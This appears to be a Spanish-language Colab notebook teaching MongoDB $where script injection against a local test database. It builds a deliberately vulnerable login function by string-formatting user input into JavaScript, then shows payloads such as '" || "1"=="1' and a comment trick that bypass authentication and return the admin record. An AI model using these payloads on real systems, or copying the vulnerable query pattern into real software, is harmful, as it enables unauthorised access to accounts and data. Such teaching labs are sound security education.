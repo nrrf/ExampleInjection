{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyP4MehqoSxi0TsRaaahq+Vk",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/nrrf/ExampleInjection/blob/main/mongo_injection.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Simple Script Injection in Mongo"
      ],
      "metadata": {
        "id": "kduLAKAhe1Oa"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install pymongo"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CMYlH9Uwj0bW",
        "outputId": "ff8d6de9-1a6d-4627-ca11-0124c30d1c74"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n",
            "Collecting pymongo\n",
            "  Downloading pymongo-4.3.3-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (492 kB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m492.1/492.1 kB\u001b[0m \u001b[31m15.0 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hCollecting dnspython<3.0.0,>=1.16.0\n",
            "  Downloading dnspython-2.3.0-py3-none-any.whl (283 kB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m283.7/283.7 kB\u001b[0m \u001b[31m28.9 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hInstalling collected packages: dnspython, pymongo\n",
            "Successfully installed dnspython-2.3.0 pymongo-4.3.3\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "UGQ4_2fkewUh",
        "outputId": "8fadf3f4-f0d2-4d7c-8aaf-6b84b3fbeeb9"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "WARNING: apt does not have a stable CLI interface. Use with caution in scripts.\n",
            "\n",
            " * Starting database mongodb\n",
            "   ...done.\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['admin', 'config', 'local']"
            ]
          },
          "metadata": {},
          "execution_count": 3
        }
      ],
      "source": [
        "# install and start server\n",
        "!apt install mongodb >log\n",
        "!service mongodb start\n",
        "\n",
        "from pymongo import MongoClient\n",
        "client = MongoClient()\n",
        "client.list_database_names() # ['admin', 'local']"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Ahora tenemos un Script "
      ],
      "metadata": {
        "id": "TvI89NTikInM"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "data = [\n",
        "  {\n",
        "    \"_id\":1,\n",
        "    \"username\":\"admin1\",\n",
        "    \"password\":\"admin1!\",\n",
        "    \"name\":\"Admin\",\n",
        "    \"surname\":\"User\"\n",
        "  },\n",
        "  {\n",
        "    \"_id\":2,\n",
        "    \"username\":\"user1\",\n",
        "    \"password\":\"user1!\",\n",
        "    \"name\":\"Test\",\n",
        "    \"surname\":\"User\"\n",
        "  },\n",
        "  {\n",
        "    \"_id\":3,\n",
        "    \"username\":\"user2\",\n",
        "    \"password\":\"user2!\",\n",
        "    \"name\":\"Test2\",\n",
        "    \"surname\":\"User\"\n",
        "  }\n",
        "]"
      ],
      "metadata": {
        "id": "4S-zjJ__jmcU"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "miDb = client.injection\n",
        "miCol = miDb.user\n",
        "x = miCol.insert_many(data)"
      ],
      "metadata": {
        "id": "vtukSTXuljVe"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "client.list_database_names()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "wIGi9cjRloe1",
        "outputId": "09de1145-6623-4f37-e777-47adf04d6f0f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['admin', 'config', 'injection', 'local']"
            ]
          },
          "metadata": {},
          "execution_count": 17
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "miDoc = miCol.find_one({\"_id\":2})\n",
        "print(miDoc)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "pZ68E0wL3Ji3",
        "outputId": "82186f09-f2a5-4663-db98-4f3589e6d276"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "{'_id': 2, 'username': 'user1', 'password': 'user1!', 'name': 'Test', 'surname': 'User'}\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "miDoc = miCol.find_one({ \"username\": \"user1\", \"password\": \"user1!\" }) \n",
        "miDoc"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "zmSbTH4945T3",
        "outputId": "314afcb6-4c77-4ae3-89c4-7076993d12e4"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'_id': 2,\n",
              " 'username': 'user1',\n",
              " 'password': 'user1!',\n",
              " 'name': 'Test',\n",
              " 'surname': 'User'}"
            ]
          },
          "metadata": {},
          "execution_count": 33
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "miDoc = miCol.find_one({\n",
        "    \"$where\": \"\"\"function() { return this.username == \\\"%s\\\" && this.password == \\\"%s\\\"}\"\"\" % (username, password)}) \n",
        "miDoc"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "zLKv9NJf9LvZ",
        "outputId": "02f475a8-fb25-44b0-ff64-3c715d56f601"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'_id': 1,\n",
              " 'username': 'admin1',\n",
              " 'password': 'admin1!',\n",
              " 'name': 'Admin',\n",
              " 'surname': 'User'}"
            ]
          },
          "metadata": {},
          "execution_count": 52
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "def user_authentication(username,password):\n",
        "  FIND_USER_BY_USERNAME_PASSWORD = \"{$where: 'function() { return this.username == \\\"%s\\\" && this.password == \\\"%s\\\"}'}\" \n",
        "  query = \"\"\"function() { return this.username == \\\"%s\\\" && this.password == \\\"%s\\\"}\"\"\" % (username, password) \n",
        "  print(query)\n",
        "  #user_in_db = miCol.find_one({ \"username\": username, \"password\": password })  \n",
        "  user_in_db = miCol.find_one({\n",
        "    \"$where\": query}) \n",
        "  if user_in_db == None:\n",
        "    raise Exception(\"status_code=404, detail=Autenticacion fallida\")\n",
        "  return {\"Autenticado\": True, \"credenciales de usuario\": user_in_db}"
      ],
      "metadata": {
        "id": "XfiWwPUamtpI"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Pruebas generales  \n",
        "\n",
        "Vamos a probar el request de autenticacion comunes, sin script injection"
      ],
      "metadata": {
        "id": "CWycPzmsDkeY"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Usuario correcto - Password incorrecto"
      ],
      "metadata": {
        "id": "GVUUTmZCDfAN"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#@title Click `Show code` in the code cell. { display-mode: \"form\" }\n",
        "\n",
        "username = 'user1' #@param {type: \"string\"}\n",
        "password = 'adm' #@param {type: \"string\"}"
      ],
      "metadata": {
        "id": "RJTd76NzmVpn"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "user_authentication(username,password)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 287
        },
        "id": "nO1qirtRCF_E",
        "outputId": "f8d53dd0-6251-476e-ee38-34539e516fcc"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "function() { return this.username == \"user1\" && this.password == \"adm\"}\n"
          ]
        },
        {
          "output_type": "error",
          "ename": "Exception",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mException\u001b[0m                                 Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-120-730b0a102ce0>\u001b[0m in \u001b[0;36m<cell line: 1>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0muser_authentication\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0musername\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mpassword\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
            "\u001b[0;32m<ipython-input-118-1abb63b273dc>\u001b[0m in \u001b[0;36muser_authentication\u001b[0;34m(username, password)\u001b[0m\n\u001b[1;32m      7\u001b[0m     \"$where\": query}) \n\u001b[1;32m      8\u001b[0m   \u001b[0;32mif\u001b[0m \u001b[0muser_in_db\u001b[0m \u001b[0;34m==\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 9\u001b[0;31m     \u001b[0;32mraise\u001b[0m \u001b[0mException\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"status_code=404, detail=Autenticacion fallida\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     10\u001b[0m   \u001b[0;32mreturn\u001b[0m \u001b[0;34m{\u001b[0m\u001b[0;34m\"Autenticado\"\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m\"credenciales de usuario\"\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0muser_in_db\u001b[0m\u001b[0;34m}\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mException\u001b[0m: status_code=404, detail=Autenticacion fallida"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Usuario incorrecto, password existente"
      ],
      "metadata": {
        "id": "HlipI-JYEAjs"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#@title Click `Show code` in the code cell. { display-mode: \"form\" }\n",
        "\n",
        "username = 'sasa' #@param {type: \"string\"}\n",
        "password = 'user1!' #@param {type: \"string\"}"
      ],
      "metadata": {
        "id": "zc95RE8VDcG8"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "user_authentication(username,password)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 287
        },
        "id": "X0bOUzfiEFJ4",
        "outputId": "a98cd922-7771-4899-b0bd-e6d9e8fcebff"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "function() { return this.username == \"sasa\" && this.password == \"user1!\"}\n"
          ]
        },
        {
          "output_type": "error",
          "ename": "Exception",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mException\u001b[0m                                 Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-122-730b0a102ce0>\u001b[0m in \u001b[0;36m<cell line: 1>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0muser_authentication\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0musername\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mpassword\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
            "\u001b[0;32m<ipython-input-118-1abb63b273dc>\u001b[0m in \u001b[0;36muser_authentication\u001b[0;34m(username, password)\u001b[0m\n\u001b[1;32m      7\u001b[0m     \"$where\": query}) \n\u001b[1;32m      8\u001b[0m   \u001b[0;32mif\u001b[0m \u001b[0muser_in_db\u001b[0m \u001b[0;34m==\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 9\u001b[0;31m     \u001b[0;32mraise\u001b[0m \u001b[0mException\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"status_code=404, detail=Autenticacion fallida\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     10\u001b[0m   \u001b[0;32mreturn\u001b[0m \u001b[0;34m{\u001b[0m\u001b[0;34m\"Autenticado\"\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m\"credenciales de usuario\"\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0muser_in_db\u001b[0m\u001b[0;34m}\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mException\u001b[0m: status_code=404, detail=Autenticacion fallida"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Autenticacion Correcta"
      ],
      "metadata": {
        "id": "bASs9U8REkT3"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#@title Click `Show code` in the code cell. { display-mode: \"form\" }\n",
        "\n",
        "username = 'user1' #@param {type: \"string\"}\n",
        "password = 'user1!' #@param {type: \"string\"}"
      ],
      "metadata": {
        "id": "7kNuW-PDEoup"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "user_authentication(username,password)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "oaJv_-xREnaj",
        "outputId": "c998b0de-d953-47b3-bb46-047a4a0e8728"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "function() { return this.username == \"user1\" && this.password == \"user1!\"}\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'Autenticado': True,\n",
              " 'credenciales de usuario': {'_id': 2,\n",
              "  'username': 'user1',\n",
              "  'password': 'user1!',\n",
              "  'name': 'Test',\n",
              "  'surname': 'User'}}"
            ]
          },
          "metadata": {},
          "execution_count": 124
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Prueba de Script Injection \n",
        "\n",
        "Ahora vamos a usar unos pequeños trucos de script injection para evadir la autenticacion al sitio tomando ya sea un usuario especifico o el primero que se encuentre en la base de datos"
      ],
      "metadata": {
        "id": "sSyT2h2dEzWO"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "username = 'user1\" || \"1\"==\"1'\n",
        "password = \"asc\""
      ],
      "metadata": {
        "id": "S7tJ7PawE27B"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "user_authentication(username,password)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ZUTtLf3PGGWJ",
        "outputId": "c53e7aa7-7d4f-46ee-bdd9-938a161d26f7"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "function() { return this.username == \"user1\" || \"1\"==\"1\" && this.password == \"asc\"}\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'Autenticado': True,\n",
              " 'credenciales de usuario': {'_id': 2,\n",
              "  'username': 'user1',\n",
              "  'password': 'user1!',\n",
              "  'name': 'Test',\n",
              "  'surname': 'User'}}"
            ]
          },
          "metadata": {},
          "execution_count": 126
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Vemos que se hace un script injection y se hace una condicion que siempre es True ya que \"1\"==\"1\" siempre se cumple"
      ],
      "metadata": {
        "id": "hw2PHz3HMLy6"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Ahora vamos a hacer otro script injection, pero esta vez vamos a hacer el injection en el campo de password"
      ],
      "metadata": {
        "id": "UEd8M_j1M0wJ"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "username = 'user1'\n",
        "password = 'abc\"|| \"1\"==\"1'"
      ],
      "metadata": {
        "id": "JoricC6sM_wn"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "user_authentication(username,password)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "LVwUYme7NS-V",
        "outputId": "8c9d95fc-afbf-45fa-9f47-7a28932271d6"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "function() { return this.username == \"user1\" && this.password == \"abc\"|| \"1\"==\"1\"}\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'Autenticado': True,\n",
              " 'credenciales de usuario': {'_id': 1,\n",
              "  'username': 'admin1',\n",
              "  'password': 'admin1!',\n",
              "  'name': 'Admin',\n",
              "  'surname': 'User'}}"
            ]
          },
          "metadata": {},
          "execution_count": 132
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Ahora vamos a hacer login de un usuario sin siquiera poniendo cualquier nombre de usuario (no necesita estar registrado en la base de datos )\n",
        "\n"
      ],
      "metadata": {
        "id": "AUQBVolfNfrc"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "username = 'abc\" /* '\n",
        "password = 'abc */||\"1\"==\"1'"
      ],
      "metadata": {
        "id": "p5I4v5iaNWOA"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "user_authentication(username,password)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ID4v_mmeONkl",
        "outputId": "0a83456e-deed-4279-997d-0b4d71337275"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "function() { return this.username == \"abc\" /* \" && this.password == \"abc */||\"1\"==\"1\"}\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'Autenticado': True,\n",
              " 'credenciales de usuario': {'_id': 1,\n",
              "  'username': 'admin1',\n",
              "  'password': 'admin1!',\n",
              "  'name': 'Admin',\n",
              "  'surname': 'User'}}"
            ]
          },
          "metadata": {},
          "execution_count": 134
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Bibliografia  \n",
        "\n",
        "- https://colab.research.google.com/drive/1uDo5AOCESYN-3AwHx22ylc3M5B9Cli4m?usp=sharing\n",
        "\n",
        "- https://www.google.com/search?q=run+flask+app+with+colab&rlz=1C1GCEU_esCO1044CO1044&oq=run+flask+app+with+colab+&aqs=chrome..69i57j0i22i30.16937j0j4&sourceid=chrome&ie=UTF-8"
      ],
      "metadata": {
        "id": "Lep1-b6P0IcV"
      }
    }
  ]
}